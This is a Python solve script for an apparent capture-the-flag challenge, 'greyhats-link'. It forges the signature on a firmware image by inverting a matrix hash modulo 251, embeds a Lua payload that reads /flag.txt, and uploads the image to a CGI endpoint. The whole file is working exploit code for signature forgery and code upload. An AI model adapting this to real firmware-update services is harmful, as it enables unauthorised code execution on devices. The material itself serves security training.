#!/usr/bin/env python3
"""
Solve for greyhats-link.

The CGI verifies firmware using a 4x4 matrix hash over Z/251:
  H = product of (block_i XOR round_constant_i) for each 16-byte block
Signature S must satisfy H * S = I (mod 251), i.e. S = H^{-1}.

Steps:
  1. Craft a Lua payload that reads /flag.txt
  2. Hash the payload (matrix chain multiply, pad to 16-byte blocks)
  3. Invert the hash mod 251 to get the signature
  4. Build the firmware binary (GREY header + CODE + CERT sections)
  5. Upload via multipart POST to the CGI
"""

import struct
import sys

import requests

P = 251
CODE_TYPE = 0x01
CERT_TYPE = 0x06


# -- Matrix operations over Z/251 (4x4) --


def mat_identity():
    return [[1 if i == j else 0 for j in range(4)] for i in range(4)]


def mat_from_bytes(data, offset=0):
    return [[(data[offset + i * 4 + j]) % P for j in range(4)] for i in range(4)]


def mat_to_bytes(M):
    out = bytearray(16)
    for i in range(4):
        for j in range(4):
            out[i * 4 + j] = M[i][j] % 256
    return bytes(out)


def mat_multiply(A, B):
    C = [[0] * 4 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            s = 0
            for k in range(4):
                s += A[i][k] * B[k][j]
            C[i][j] = s % P
    return C


def mat_xor(A, B):
    return [[(A[i][j] ^ B[i][j]) % P for j in range(4)] for i in range(4)]


def round_constant(index):
    M = [[0] * 4 for _ in range(4)]
    seed = (index * 2654435761 + 1) & 0xFFFFFFFF
    for i in range(4):
        for j in range(4):
            seed = (seed * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFF
            M[i][j] = ((seed >> 16) & 0xFF) % P
    return M


# -- Hash --


def pad_to_16(data):
    rem = len(data) % 16
    if rem == 0:
        return data
    pad_len = 16 - rem
    return data + bytes([pad_len] * pad_len)


def compute_hash(data):
    data = pad_to_16(data)
    state = mat_identity()
    for bi in range(len(data) // 16):
        block = list(data[bi * 16 : bi * 16 + 16])
        block_mat = mat_from_bytes(block)
        rc = round_constant(bi)
        state = mat_multiply(state, mat_xor(block_mat, rc))
    return state


# -- Matrix inverse mod P --


def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x, y = extended_gcd(b % a, a)
    return g, y - (b // a) * x, x


def mod_inv(a, m):
    a = a % m
    if a == 0:
        return None
    g, x, _ = extended_gcd(a, m)
    if g != 1:
        return None
    return x % m


def minor_3x3(M, skip_r, skip_c):
    R = []
    for i in range(4):
        if i == skip_r:
            continue
        row = []
        for j in range(4):
            if j == skip_c:
                continue
            row.append(M[i][j])
        R.append(row)
    return R


def det_3x3(M):
    return (
        M[0][0] * (M[1][1] * M[2][2] - M[1][2] * M[2][1])
        - M[0][1] * (M[1][0] * M[2][2] - M[1][2] * M[2][0])
        + M[0][2] * (M[1][0] * M[2][1] - M[1][1] * M[2][0])
    ) % P


def det_4x4(M):
    d = 0
    for j in range(4):
        sign = 1 if j % 2 == 0 else P - 1
        d = (d + M[0][j] * sign * det_3x3(minor_3x3(M, 0, j))) % P
    return d


def mat_inverse(M):
    d = det_4x4(M)
    d_inv = mod_inv(d, P)
    if d_inv is None:
        return None
    inv = [[0] * 4 for _ in range(4)]
    for i in range(4):
        for j in range(4):
            sign = 1 if (i + j) % 2 == 0 else P - 1
            inv[i][j] = (sign * det_3x3(minor_3x3(M, j, i)) * d_inv) % P
    return inv


# -- Firmware builder --


def build_firmware(code, cert):
    sections = [
        (CODE_TYPE, code, 1),
        (CERT_TYPE, cert, 8),
    ]

    entries = []
    offset = 0
    payload_parts = []
    for type_id, data, flags in sections:
        entries.append((type_id, offset, len(data), flags))
        payload_parts.append(data)
        offset += len(data)

    payload = b"".join(payload_parts)
    num_sections = len(entries)
    header_size = 0x38 + num_sections * 16

    hdr = b"GREY"
    hdr += struct.pack("<HH", 1, 0)
    hdr += struct.pack("<I", header_size)
    hdr += struct.pack("<I", num_sections)
    hdr += struct.pack("<I", 0)
    hdr += b"\x00" * 32
    hdr += struct.pack("<I", len(payload))

    for type_id, off, size, flags in entries:
        hdr += struct.pack("<IIII", type_id, off, size, flags)

    return hdr + payload


def mat_print(M, label="Matrix"):
    print(f"  {label}:")
    for row in M:
        print("    [" + ", ".join(f"{v:3d}" for v in row) + "]")


def forge_firmware():
    payload_code = (
        'io.write("Content-Type: text/html\\r\\n\\r\\n")\n'
        'local f = io.open("/flag.txt", "r")\n'
        'local flag = f and f:read("*a") or "grey{missing_flag}"\n'
        "if f then f:close() end\n"
        'io.write(flag .. "\\n")\n'
    )
    code = payload_code.encode()

    print(f"[*] Payload: {len(code)} bytes")
    H = compute_hash(code)
    d = det_4x4(H)
    print(f"[*] Hash det = {d}")
    mat_print(H, "H")

    S = mat_inverse(H)
    if S is None:
        print("[-] Hash matrix is singular mod 251")
        sys.exit(1)

    product = mat_multiply(H, S)
    assert product == mat_identity(), "H*S != I"
    print("[+] Signature verified: H * S = I")
    mat_print(S, "S = H^-1")

    cert = mat_to_bytes(S)
    fw = build_firmware(code, cert)
    print(f"[+] Firmware: {len(fw)} bytes")
    return fw


def exploit(url):
    url = url.rstrip("/")
    fw = forge_firmware()

    print(f"\n[*] Uploading firmware to {url} ...")
    r = requests.post(
        f"{url}/cgi-bin/index.cgi",
        files={"firmware": ("firmware.bin", fw, "application/octet-stream")},
        timeout=10,
    )
    print(f"[*] Upload response: {r.status_code} — {r.text.strip()[:200]}")

    if "Success" in r.text:
        print("[+] Firmware accepted! Fetching flag ...")
        r2 = requests.get(f"{url}/cgi-bin/index.cgi", timeout=10)
        flag = r2.text.strip()
        print(f"[+] Flag: {flag}")
    elif "ERROR" in r.text:
        print(f"[-] Firmware rejected: {r.text.strip()[:200]}")
    else:
        print("[-] Unexpected response")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"  e.g. {sys.argv[0]} http://localhost:32067")
        sys.exit(1)

    exploit(sys.argv[1])
